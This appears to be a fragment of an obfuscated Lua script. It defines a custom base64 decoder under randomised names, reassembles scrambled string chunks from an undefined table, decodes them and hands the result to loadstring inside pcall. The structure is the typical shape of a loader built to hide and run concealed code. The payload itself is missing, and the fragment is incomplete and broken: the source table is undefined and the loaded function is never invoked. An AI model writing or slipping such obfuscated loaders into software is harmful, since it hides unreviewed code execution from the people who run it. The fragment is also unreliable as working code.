local function _oayhovcb(s)
	local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
	s = s:gsub('[^'..b..'=]', '')
	return (s:gsub('.', function(x)
		if x == '=' then return '' end
		local r, f = '', (b:find(x) - 1)
		for i = 6, 1, -1 do
			r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0')
		end
		return r
	end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
		if #x ~= 8 then return '' end
		local c = 0
		for i = 1, 8 do
			c = c + (x:sub(i, i) == '1' and 2^(8-i) or 0)
		end
		return string.char(c)
	end))
end

local _xwoahiaz = {}
for _yaixckek = 0, #_ywbbigqv - 1 do
	local _xpamexws = _ywbbigqv[_yaixckek]
	if _yaixckek % 3 == 1 then
		_xpamexws = _xpamexws:reverse()
	elseif _yaixckek % 3 == 2 then
		local m = math.floor(#_xpamexws / 2)
		_xpamexws = _xpamexws:sub(m + 1) .. _xpamexws:sub(1, m)
	end
	_xwoahiaz[_yaixckek + 1] = _xpamexws
end

local _uanoxsgu = table.concat(_xwoahiaz)
local _oyrnyjrk = _oayhovcb(_uanoxsgu)
local _jokmrngg = loadstring or load
local ok, err = pcall(function()
	local fn = _jokmrngg(_oyrnyjrk)
	if not fn then error('decode failed') end

end)
